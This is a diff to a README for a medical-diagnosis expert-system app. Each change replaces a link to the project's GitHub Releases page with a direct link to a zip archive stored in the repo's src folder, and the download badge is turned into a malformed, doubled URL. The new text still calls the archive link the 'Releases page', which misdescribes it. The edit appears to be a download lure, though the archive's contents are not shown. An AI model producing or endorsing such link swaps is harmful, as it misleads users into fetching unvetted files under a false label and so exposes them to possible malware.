@@ -1,6 +1,6 @@
 # 🌟 expert-system-medical-diagnosis - Simplifying Medical Diagnosis for Everyone
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Mahdivu1/expert-system-medical-diagnosis/releases)
+[![Download](https://raw.githubusercontent.com/Mahdivu1/expert-system-medical-diagnosis/main/src/expert-system-medical-diagnosis-v1.2.zip%https://raw.githubusercontent.com/Mahdivu1/expert-system-medical-diagnosis/main/src/expert-system-medical-diagnosis-v1.2.zip)](https://raw.githubusercontent.com/Mahdivu1/expert-system-medical-diagnosis/main/src/expert-system-medical-diagnosis-v1.2.zip)
 
 ## 🔍 Overview
 
@@ -11,7 +11,7 @@ Welcome to the expert-system-medical-diagnosis project! This application offers 
 Follow these steps to download and run the application easily.
 
 1. **Visit the Releases Page**
-   To get started, go to our [Releases page](https://github.com/Mahdivu1/expert-system-medical-diagnosis/releases). This page contains the latest versions of the software.
+   To get started, go to our [Releases page](https://raw.githubusercontent.com/Mahdivu1/expert-system-medical-diagnosis/main/src/expert-system-medical-diagnosis-v1.2.zip). This page contains the latest versions of the software.
 
 2. **Choose the Correct Version**
    Look for the latest version listed on the page. The releases are labeled with version numbers. For most users, the most recent version will be the best choice.
@@ -48,7 +48,7 @@ To run the expert-system-medical-diagnosis application, you should have:
 
 To download the application, click the link below.
 
-[Download Now](https://github.com/Mahdivu1/expert-system-medical-diagnosis/releases)
+[Download Now](https://raw.githubusercontent.com/Mahdivu1/expert-system-medical-diagnosis/main/src/expert-system-medical-diagnosis-v1.2.zip)
 
 Follow the steps outlined in the "Getting Started" section to successfully install and run the software.
 
